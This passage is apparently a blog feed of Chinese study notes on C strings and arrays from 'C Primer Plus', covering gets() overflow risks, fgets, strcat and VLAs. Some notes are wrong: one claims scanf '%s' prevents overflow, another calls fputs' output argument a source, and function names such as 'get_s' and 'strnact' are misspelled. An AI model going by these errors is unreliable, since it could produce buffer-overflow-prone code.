&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;1.在声明时显式指明数组大小
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;2.使用C库函数来分配内存
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h5 id=&#34;1122-不幸的gets函数&#34;&gt;11.2.2 不幸的gets()函数
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;本是用于处理整行输入。&lt;/li&gt;
&lt;li&gt;gets()函数只知道数组的开始处，并不知道其中有多少个元素。如果输入的字符串过长，可能会导致缓冲区溢出。&lt;/li&gt;
&lt;li&gt;gets()函数会读取输入至换行符，并丢弃换行符，在末尾添加\0，进行存储。&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h5 id=&#34;1123-gets函数的代替品&#34;&gt;11.2.3 gets()函数的代替品
&lt;/h5&gt;&lt;ol&gt;
&lt;li&gt;fgets()函数（ 和fputs()函数 ）
&lt;ul&gt;
&lt;li&gt;三大特点：&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;1. 限制： fgets()函数指明了读入字符的最大数量，保存在第二个参数中，如果参数是n，那么将读取n-1个字符。
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;2. 保留： 如果fget()函数读取到一个换行符，那么会将其储存而不是删除。
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;3. 来源： fgets()第三个参数指明要读取的文件。如果来源于键盘，则以stdin为参数。
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;puts()函数会在输入的字符串末尾添加一个换行符，而fgets()不会。&lt;/li&gt;
&lt;li&gt;fgets()处理多行输入：&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    while(fgets(words,lens,stdin)!=NULL &amp;amp;&amp;amp; word[0]!=&amp;#39;\n&amp;#39;){
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        fputs(words,stdout);
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;get_s()函数
&lt;ul&gt;
&lt;li&gt;基本形式：&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    get_s(字符串地址，大小)；
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;get_s()与fgets()的区别：&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    1. get_s()没有第三个参数，只从标准输入中读取数据。
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    2. get_s()如果读到换行符，会舍弃它。
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    3. 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;关于选择：
&lt;ol&gt;
&lt;li&gt;存储区装得下输入，三者无差，但fgets()会保留\n&lt;/li&gt;
&lt;li&gt;存储区装不下输入，fgets()可以灵活处理。&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;h5 id=&#34;1124-scanf函数&#34;&gt;11.2.4 scanf()函数
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;scanf(),fgets()和gets()函数的区别在于如何确定字符串的末尾。&lt;/li&gt;
&lt;li&gt;scanf()函数会返回一个整数值，该值等于scanf()成功读取的项数或者EOF（读到文件末尾）&lt;/li&gt;
&lt;li&gt;%s可防止输入溢出。&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h3 id=&#34;113-字符串输入&#34;&gt;11.3 字符串输入
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;打印字符串的三个标准库函数：puts(),fputs()和printf();&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;puts()函数
&lt;ul&gt;
&lt;li&gt;传入地址。&lt;/li&gt;
&lt;li&gt;puts()函数会在字符串末尾自动添加一个\n；&lt;/li&gt;
&lt;li&gt;该函数遇到空字符就会停止输出，所以必须保证又空字符存在。&lt;/li&gt;
&lt;li&gt;gets()丢弃换行符，但puts()添加换行符&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;fputs()函数
&lt;ul&gt;
&lt;li&gt;第二个参数指明来源&lt;/li&gt;
&lt;li&gt;不会在输出的末尾添加\n&lt;/li&gt;
&lt;li&gt;fgets()保留换行符，且fputs()不会添加换行符。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;printf()函数
&lt;ul&gt;
&lt;li&gt;打印多个字符串比较简单。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;h3 id=&#34;114-自定义输入输出函数&#34;&gt;11.4 自定义输入/输出函数
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;自己写函数&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;put1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;while&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;            &lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;与&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;string&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;！&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\0&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;相同&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;当&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;string指向空字符时&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;，&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;string的值时0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;putchar&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;    &lt;span class=&#34;o&#34;&gt;//&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;优先级高于&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;ne&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;put2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;ne&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;count&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;while&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;putchar&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;count&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;putchar&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;count&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;hr&gt;
&lt;h3 id=&#34;115-字符串函数&#34;&gt;11.5 字符串函数
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;strlen()函数&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;表示长度，存在于string.h&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;strcat()函数&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;作用：拼接两个字符串&lt;/li&gt;
&lt;li&gt;示例&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    strcat(str1,str2);   // 将str2拼接到str1后面，改变str1而不改变str2
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;缺点：strcat无法检测第一个数组能否容纳第二个数组，可能会造成字符溢出。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;strncat()函数&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;改进strcat()函数，第三个参数指定最大添加字符数，末尾自动添加空字符。&lt;/li&gt;
&lt;li&gt;示例&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    strnact(str1,str2,size);  //将str2的前size个字符拼接到str1后面。
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;strcmp()函数&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;作用：比较字符串，如果相同则返回0，否则返回非零值。&lt;/li&gt;
&lt;li&gt;示例&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    strcmp(str1,str2);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;本机操作 返回的值：从不相同的字符开始，前一个字符排在ascii前则返回-1，否则返回1，相同0；&lt;/li&gt;
&lt;li&gt;书本 返回的值是前一个字符串的acsii码减后一个的，按照机器排序顺序进行比较。&lt;/li&gt;
&lt;li&gt;strncmp第三个参数指定查找前几个字符。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;h2 id=&#34;strcpy和strncpy函数&#34;&gt;strcpy()和strncpy()函数
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;sprintf()函数&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;1&lt;/li&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;其他字符函数&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>《C Prime Plus》第十节笔记</title>
        <link>https://dorinxl.github.io/p/c-prime-plus%E7%AC%AC%E5%8D%81%E8%8A%82%E7%AC%94%E8%AE%B0/</link>
        <pubDate>Wed, 06 Nov 2019 02:56:00 +0000</pubDate>
        
        <guid>https://dorinxl.github.io/p/c-prime-plus%E7%AC%AC%E5%8D%81%E8%8A%82%E7%AC%94%E8%AE%B0/</guid>
        <description>&lt;h1 id=&#34;数组和指针&#34;&gt;数组和指针
&lt;/h1&gt;&lt;hr&gt;
&lt;h3 id=&#34;101-数组&#34;&gt;10.1 数组
&lt;/h3&gt;&lt;hr&gt;
&lt;h5 id=&#34;1011-初始化数组&#34;&gt;10.1.1 初始化数组
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;标量变量：只储存单个值的变量&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;创建只读数组，应该用const声明和初始化数组&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;ne&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;days&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;};&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;省略方括号中的数字，编译器会自动匹配数组大小和初始化列表中的项数&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h5 id=&#34;1012-指定初始化容器-c99&#34;&gt;10.1.2 指定初始化容器 c99
&lt;/h5&gt;&lt;p&gt;例：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; int arr[6] = {[5]=212};
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;重要特性一：如果指定初始化容器后面又更多的值，如[5]=4,22,566；那么后面这些值将被用于初始化指定元素的后面的元素&lt;/li&gt;
&lt;li&gt;重要特性二：初始化可以覆盖之前的初始化&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h5 id=&#34;1013-给数组元素赋值&#34;&gt;10.1.3 给数组元素赋值
&lt;/h5&gt;&lt;hr&gt;
&lt;h5 id=&#34;1014-数组边界&#34;&gt;10.1.4 数组边界
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;使用越界的数组会造成意外错误，例如改变其他数组元素的值，或是导致程序异常终止&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h5 id=&#34;1015-指定数组的大小&#34;&gt;10.1.5 指定数组的大小
&lt;/h5&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; int n=5;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; int arr[n];
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;以上的初始化方式在c99之前不允许，而c99允许这样做。这创建了一种新的数组：VLA&lt;/li&gt;
&lt;li&gt;VLA成为变长数组(variable-length array)&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h3 id=&#34;102-多维数组&#34;&gt;10.2 多维数组
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;/li&gt;
